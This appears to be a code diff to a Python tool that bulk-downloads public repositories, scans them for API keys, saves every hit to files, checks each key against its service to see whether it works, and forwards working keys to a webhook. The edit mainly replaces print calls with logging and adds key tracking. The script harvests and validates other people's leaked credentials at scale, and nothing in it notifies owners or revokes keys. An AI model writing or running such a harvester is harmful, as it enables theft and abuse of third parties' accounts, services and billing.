@@ -6,9 +6,12 @@ from datetime import datetime
 from pathlib import Path
 import re
 import shutil
+import logging
 from config import API_KEY_PATTERNS
 from key_validator import KeyValidator
 from webhook_notifier import send_webhook_notification
+
+logger = logging.getLogger(__name__)
 
 def scan_repo_for_keys(repo_path):
     """
@@ -213,10 +216,18 @@ def save_key(key_data, key_type, is_working=False):
     Save found API key to file immediately (only the key, no metadata).
     """
     filename = "working_api_keys.txt" if is_working else "found_api_keys.txt"
+    key = key_data['key']
     
     with open(filename, "a", encoding="utf-8") as f:
-        f.write(f"{key_data['key']}\n")
+        f.write(f"{key}\n")
         f.flush()
+    
+    # Track key in current run if app is available
+    try:
+        import key_tracker
+        key_tracker.track_key(key)
+    except:
+        pass  # Silently fail if tracking not available
 
 def bulk_downloader():
     """
@@ -242,18 +253,18 @@ def bulk_downloader():
     
     # Read repo URLs
     if not os.path.exists("repo_list.txt"):
-        print("❌ Error: repo_list.txt not found. Run big.py first!")
+        logger.error("❌ Error: repo_list.txt not found. Run big.py first!")
         return
     
     with open("repo_list.txt", "r") as f:
         urls = [line.strip() for line in f if line.strip()]
     
     total_repos = len(urls)
-    print(f"🚀 Starting download and scan of {total_repos} repositories...")
-    print(f"📊 Using 30 parallel workers for maximum speed")
-    print(f"🗑️  Repositories will be deleted after scanning to save disk space")
-    print(f"⏱️  Timing: Total | Download | Scan | Delete | Status")
-    print(f"{'='*80}")
+    logger.info(f"🚀 Starting download and scan of {total_repos} repositories...")
+    logger.info(f"📊 Using 30 parallel workers for maximum speed")
+    logger.info(f"🗑️  Repositories will be deleted after scanning to save disk space")
+    logger.info(f"⏱️  Timing: Total | Download | Scan | Delete | Status")
+    logger.info(f"{'='*80}")
     
     start_time = time.time()
     completed = 0
@@ -272,12 +283,13 @@ def bulk_downloader():
             
             try:
                 result_msg, found_keys = future.result()
-                print(result_msg)
+                logger.info(result_msg)
                 
                 # Process found keys
                 for key_data in found_keys:
                     total_keys_found += 1
                     save_key(key_data, key_data['type'], is_working=False)
+                    logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
                     
                     # Test if key is working
                     try:
@@ -285,31 +297,34 @@ def bulk_downloader():
                         if is_valid:
                             total_working_keys += 1
                             save_key(key_data, key_data['type'], is_working=True)
+                            logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
                             # Send webhook notification
                             send_webhook_notification(key_data['key'], key_data['type'], message)
-                    except Exception:
-                        pass  # Skip validation errors
+                        else:
+                            logger.debug(f"❌ Invalid {key_data['type']} key: {message}")
+                    except Exception as e:
+                        logger.warning(f"Error testing key: {e}")
                 
                 # Progress update every 10 repos
                 if completed % 10 == 0:
                     elapsed = time.time() - start_time
                     rate = completed / elapsed if elapsed > 0 else 0
                     remaining = (total_repos - completed) / rate if rate > 0 else 0
-                    print(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
+                    logger.info(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
                           f"Rate: {rate:.1f} repos/sec | "
                           f"ETA: {remaining:.0f}s | "
                           f"Keys: {total_keys_found} found, {total_working_keys} working\n")
                 
             except Exception as e:
-                print(f"❌ Exception processing {url}: {e}")
+                logger.error(f"❌ Exception processing {url}: {e}")
     
     # Final summary
     total_time = time.time() - start_time
-    print(f"\n{'='*80}")
-    print(f"✅ Completed: {completed}/{total_repos} repositories")
-    print(f"⏱️  Total time: {total_time:.1f}s ({total_time/60:.1f} minutes)")
-    print(f"📊 Average rate: {completed/total_time:.2f} repos/sec")
-    print(f"🔑 Keys found: {total_keys_found} total, {total_working_keys} working")
+    logger.info(f"\n{'='*80}")
+    logger.info(f"✅ Completed: {completed}/{total_repos} repositories")
+    logger.info(f"⏱️  Total time: {total_time:.1f}s ({total_time/60:.1f} minutes)")
+    logger.info(f"📊 Average rate: {completed/total_time:.2f} repos/sec")
+    logger.info(f"🔑 Keys found: {total_keys_found} total, {total_working_keys} working")
     print(f"💾 Results saved to: found_api_keys.txt and working_api_keys.txt")
 
 if __name__ == "__main__":
